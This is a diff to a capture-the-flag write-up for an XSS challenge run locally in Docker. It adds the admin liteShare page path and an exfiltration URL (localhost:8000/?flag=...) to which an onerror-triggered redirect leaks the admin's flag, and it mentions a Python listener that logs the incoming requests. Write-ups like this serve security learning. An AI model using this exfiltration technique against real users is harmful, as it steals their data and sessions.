@@ -101,7 +101,7 @@ SELECT * FROM BOOKS; (sqlite3)
 ">
 
 ```
-- considering the actual files though, the Dockerfile had to be modified, and I had to build it with no cache, 
+- considering the actual files though, the Dockerfile had to be modified, and so I had to build it with no cache, 
 
 ```
 docker build --no-cache -t chal .
@@ -109,9 +109,18 @@ docker run -p 50001:1337 chal
 ```
 - Also the internal bot that was supposed to automatically check the URL was commented out in main.js, this meant we had to physically login as admin and check the URL using liteshare.
 
-- the flag was finally revealed since the XSS would fire after the page was loaded using liteShare, where it would redirect to the exfil server (in this case localhost:8000/flagurl), or otherwise in the payload could be put in the console to redirect it. 
+- The flag was finally revealed since the XSS would fire after the page was loaded using liteShare, where it would redirect to the exfil server (in this case localhost:8000/flagurl), or otherwise the payload could be executed in the console on the page of the admin liteshare, which is:
 
-- the python script, prints out any incoming requests to the exfiltration server, and the code has been attached.
+```
+  http://localhost:50001/liteShare/victimXXXX/<liteId>
+```
+- And the exfiltration server redirection with onerror firing that would have the admin book leak, would be:
+
+```
+http://localhost:8000/?flag=...
+```
+
+- The python script, prints out any incoming requests to the exfiltration server, and the code has been attached.
 
 ## Flag:
 
